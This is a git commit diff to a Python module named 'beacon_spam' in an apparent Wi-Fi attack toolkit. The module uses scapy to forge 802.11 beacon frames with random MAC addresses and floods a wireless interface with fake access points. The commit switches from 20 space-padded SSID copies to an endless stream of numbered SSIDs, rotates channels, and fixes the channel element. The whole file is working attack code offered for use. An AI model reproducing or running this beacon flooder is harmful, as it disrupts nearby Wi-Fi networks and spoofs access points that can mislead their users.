29dd83ba8259f1691c4e17c5e41fb6a6837d8761
ImNotASkidLolus <igor_niedbala@op.pl>
2026-07-17 19:35:06 +0100

    update beacon_spam

--- src/attacks/beacon_spam.py
+++ src/attacks/beacon_spam.py
@@ -8,6 +8,7 @@ class BeaconSpam:
         self.IFACE = globals.interface
         self._stop_event = threading.Event()
         self.channel = 1
+        self.counter = 1
     def stop(self):
         self._stop_event.set()
     def build_beacon_packet(self,ssid:str, channel):
@@ -20,7 +21,7 @@ class BeaconSpam:
                 addr3=rand_mac) /
             scapy.Dot11Beacon(cap="ESS+privacy")/
             scapy.Dot11Elt(ID='SSID', info=str(ssid), len=len(ssid))/
-            scapy.Dot11ELT(ID= 3, info=(bytes(channel)))/ #set the channel
+            scapy.Dot11Elt(ID= 3, info=(bytes([channel])))/ #set the channel
             scapy.Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') / # supported rates
             scapy.Dot11Elt(ID='RSNinfo', info=( #RSN info
                 b'\x01\x00'
@@ -33,30 +34,21 @@ class BeaconSpam:
                 b'\x00\x00'))
         )
         return packet
-    def create_ssid_array(self):
-        ssids = []
-        while len(ssids) < 20:
-            random_num = random.randrange(1,30)
-            random_space = " " * random_num
-            new_ssid = globals.selected_ssid + random_space
-            if new_ssid in ssids:
-                pass
-            else:
-                ssids.append(new_ssid)
-        return ssids
     def next_channel(self):
         if self.channel < 13:
             self.channel+=1
         else:
             self.channel = 1
     def start_beacon_spam(self):
-        ssids = self.create_ssid_array()
         while not self._stop_event.is_set() and not globals.larp_mode:
             try:
-                for ssid in ssids:
+                ssid = globals.selected_ssid + str(self.counter)
+                self.counter +=1
+                if self.counter > 9999:
                     self.next_channel()
-                    pkt = self.build_beacon_packet(ssid, self.channel)
-                    scapy.sendp(pkt, iface=self.IFACE, verbose=False)
-                    time.sleep(0.1)
+                    self.counter = 1
+                pkt = self.build_beacon_packet(ssid, self.channel)
+                scapy.sendp(pkt, iface=self.IFACE, verbose=False)
+                time.sleep(0.1)
             except Exception as e:
                 time.sleep(0.1)                
